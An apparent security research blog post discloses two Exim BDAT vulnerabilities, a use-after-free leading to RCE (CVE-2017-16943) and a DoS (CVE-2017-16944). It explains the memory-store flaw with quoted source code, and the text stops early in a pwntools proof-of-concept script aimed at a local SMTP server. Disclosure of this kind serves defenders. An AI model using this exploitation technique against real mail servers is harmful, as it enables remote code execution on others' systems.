&lt;h2 id=&quot;about-exim&quot;&gt;About Exim&lt;/h2&gt;
&lt;p&gt;Exim is a message transfer agent (MTA) used on Unix systems. Exim is an open source project and is the default MTA on Debian GNU/Linux systems. According to our survey, there are about 600k SMTP servers running exim on 21st November, 2017 (data collected from scans.io). Also, a &lt;a href=&quot;http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html&quot;&gt;mail server survey&lt;/a&gt; by E-Soft Inc. shows over half of the mail servers identified are running exim.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Exim version 4.88 &amp;amp; 4.89 with chunking option enabled.&lt;/li&gt;
  &lt;li&gt;According to our survey, about 150k servers affected on 21st November, 2017 (data collected from scans.io).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h2&gt;
&lt;p&gt;Through our research, the following vulnerabilies were discovered in Exim. Both vulnerabilies involve in BDAT command. BDAT is an extension in SMTP protocol, which is used to transfer large and binary data. A BDAT command is like &lt;code class=&quot;highlighter-rouge&quot;&gt;BDAT 1024&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;BDAT 1024 LAST&lt;/code&gt;. With the SIZE and LAST declared, mail servers do not need to scan for the end dot anymore. This command was introduced to exim in version 4.88, and also brought some bugs.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Use-after-free in receive_msg leads to RCE (CVE-2017-16943)&lt;/li&gt;
  &lt;li&gt;Incorrect BDAT data handling leads to DoS  (CVE-2017-16944)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;use-after-free-in-receive_msg-leads-to-rce&quot;&gt;Use-after-free in receive_msg leads to RCE&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;To explain this bug, we need to start with the memory management of exim. There is a series of functions starts with &lt;code class=&quot;highlighter-rouge&quot;&gt;store_&lt;/code&gt; such as &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_release&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset&lt;/code&gt;. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/1.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Initially, exim allocates a big storeblock (default 0x2000) and then cut it into &lt;strong&gt;stores&lt;/strong&gt; when &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; point to it. Exim maintains three &lt;code class=&quot;highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;, that is, there are three chains like the illustration above and every global variables are actually arrays.&lt;br /&gt;
This vulnerability is in &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; where exim reads headers: &lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* header_size += 256; */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;store_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to &lt;strong&gt;extend&lt;/strong&gt; store, the function &lt;code class=&quot;highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; checks whether the old store is the latest store allocated in &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;. It returns False immediately if the check is failed.&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276&quot;&gt;store.c: 276 store_extend&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once &lt;code class=&quot;highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; fails, exim tries to get a new store and release the old one. After we look into  &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; and store_release, we found that &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; returns a &lt;strong&gt;store&lt;/strong&gt;, but &lt;code class=&quot;highlighter-rouge&quot;&gt;store_release&lt;/code&gt; releases a &lt;strong&gt;block&lt;/strong&gt; if the store is at the head of it. That is to say, if &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; points to the start the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; cuts store inside it for &lt;code class=&quot;highlighter-rouge&quot;&gt;newtext&lt;/code&gt;, then &lt;code class=&quot;highlighter-rouge&quot;&gt;store_release(next-&amp;gt;text)&lt;/code&gt; frees &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, which is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, and leaves &lt;code class=&quot;highlighter-rouge&quot;&gt;newtext&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; after &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; reachable and finally leads to an RCE.&lt;br /&gt;
Exim uses &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136&quot;&gt;function pointers&lt;/a&gt; to switch between different input sources, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getbuf&lt;/code&gt;. When receiving BDAT data, &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt; in order to check left chunking data size and to handle following command of BDAT. In &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt;, exim also uses &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;. It loops to read data, and stores data into &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, extends if insufficient.&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(;;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receive_getc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GETC_BUFFER_UNLIMITED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;cm&quot;&gt;/* If we hit EOF on a SMTP connection, it&#39;s an error, since incoming
  SMTP must have a correct &quot;.&quot; terminator. */&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EOF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* &amp;amp;&amp;amp; !smtp_batched_input */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_lost_connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; (header)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TIDYUP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;cm&quot;&gt;/* Skip to end of function */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. &lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BDAT_CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sscanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_cmd_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%u %n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_datasize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_protocol_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;missing size for BDAT command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In exim, it usually calls &lt;code class=&quot;highlighter-rouge&quot;&gt;synprot_error&lt;/code&gt; to raise error message, which also logs at the same time.&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOG_MAIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SMTP %s error in &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; %s %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;syntax&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;protocol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;string_printing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_cmd_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_and_ident&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&#39;\n&#39;-&amp;gt;&#39;\\n&#39;&lt;/code&gt;. Therefore, it asks &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; for memory to store strings.&lt;br /&gt;
This store makes &lt;code class=&quot;highlighter-rouge&quot;&gt;if (!store_extend(next-&amp;gt;text, oldsize, header_size))&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; failed when next extension occurs and then triggers use-after-free.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when &lt;strong&gt;dkim&lt;/strong&gt; is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
